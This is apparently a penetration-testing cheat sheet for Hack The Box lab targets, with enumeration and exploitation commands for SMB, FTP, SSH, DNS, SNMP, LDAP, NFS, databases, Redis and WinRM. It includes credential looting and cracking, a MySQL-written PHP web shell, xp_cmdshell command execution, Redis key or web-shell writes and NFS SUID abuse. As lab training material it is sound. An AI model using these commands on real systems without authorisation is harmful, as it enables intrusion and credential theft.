# Per-service playbooks

## SMB (139/445)

```bash
htb x "nxc smb $T"                                  # OS, domain, signing
htb x "nxc smb $T -u '' -p '' --shares"             # null session
htb x "nxc smb $T -u 'guest' -p '' --shares"
htb x "smbclient -N -L //$T/"
htb x "smbclient -N //$T/ShareName -c 'recurse ON; ls'"
htb x "smbmap -H $T -u guest"
```
Signing disabled is a relay opportunity in AD environments. Readable shares:
pull everything and grep for passwords, `.ps1`, `.vbs`, `web.config`,
`unattend.xml`, `Groups.xml` (cpassword), KeePass databases.

```bash
htb x "smbclient -N //$T/Share -c 'prompt OFF; recurse ON; mget *'"
htb x "grep -ariE 'password|pwd|secret|connectionstring' /engagements/$NAME/loot | head -50"
```

RID cycling to enumerate users without credentials:
```bash
htb x "nxc smb $T -u guest -p '' --rid-brute 4000"
htb x "enum4linux-ng -A $T"
```

## FTP (21)

```bash
htb x "ftp -n $T <<< $'user anonymous anonymous\nbinary\nls -la\nprompt off\nmget *\nbye'"
```
Check whether the FTP root is also the web root — an upload there is instant
RCE. Note the server version; vsftpd/ProFTPD have famous backdoored builds.

## SSH (22)

Record the version. Do not brute force. Once you have any username list plus a
password from elsewhere, spray it. Private keys found on disk go in `loot/`,
`chmod 600`, then `ssh -i`. Passphrase-protected keys:
```bash
htb x "ssh2john id_rsa > /engagements/$NAME/loot/key.hash && john --wordlist=/usr/share/wordlists/rockyou.txt /engagements/$NAME/loot/key.hash"
```

## DNS (53)

```bash
htb x "dig axfr @$T machine.htb"                # zone transfer
htb x "dnsenum --dnsserver $T machine.htb"
```
A successful AXFR usually hands you every vhost on the box.

## SNMP (161/udp)

```bash
htb x "onesixtyone $T -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt"
htb x "snmpwalk -v2c -c public $T | tee /engagements/$NAME/scans/snmp.txt"
htb x "snmpwalk -v2c -c public $T 1.3.6.1.2.1.25.4.2.1.2"   # running processes
```
Process listings frequently contain credentials passed on the command line.

## LDAP (389/636)

```bash
htb x "ldapsearch -x -H ldap://$T -s base namingcontexts"
htb x "ldapsearch -x -H ldap://$T -b 'DC=machine,DC=htb' | tee /engagements/$NAME/scans/ldap.txt"
```
Grep the dump for `description`, `userPassword`, `info` — admins park passwords
in those fields constantly.

## NFS (2049)

```bash
htb x "showmount -e $T"
htb x "mkdir -p /mnt/nfs && mount -t nfs $T:/export /mnt/nfs -o nolock"
```
`no_root_squash` on an export means you can drop a SUID root binary there and
execute it on the target.

## MySQL (3306) / MSSQL (1433) / PostgreSQL (5432)

```bash
htb x "mysql -h $T -u root -p''  -e 'show databases;'"
htb x "nxc mssql $T -u sa -p 'password' --local-auth -q 'SELECT @@version'"
htb x "nxc mssql $T -u sa -p 'password' --local-auth -X 'whoami'"   # xp_cmdshell
```
MySQL with FILE privilege: `SELECT LOAD_FILE('/etc/passwd')` and
`SELECT '<?php system($_GET[0]);?>' INTO OUTFILE '/var/www/html/s.php'`.

## Redis (6379)

```bash
htb x "redis-cli -h $T info; redis-cli -h $T keys '*'"
```
Unauthenticated Redis → write an SSH key into a user's `authorized_keys`, or a
web shell into the web root, via `CONFIG SET dir` + `CONFIG SET dbfilename`.

## WinRM (5985/5986)

```bash
htb x "nxc winrm $T -u user -p pass"
htb x "evil-winrm -i $T -u user -p pass"
htb x "evil-winrm -i $T -u user -H <ntlm-hash>"
```
The fastest route to an interactive Windows shell once you hold credentials.

## RPC (135/593)

```bash
htb x "rpcclient -U '' -N $T -c 'enumdomusers'"
htb x "rpcclient -U '' -N $T -c 'querydispinfo'"
```

## Anything unusual

Netcat the port and read the banner before assuming. Custom services on high
ports are frequently the intended path and are usually a buffer overflow or a
trivially injectable command handler.

```bash
htb x "nc -nv $T <port>"
```
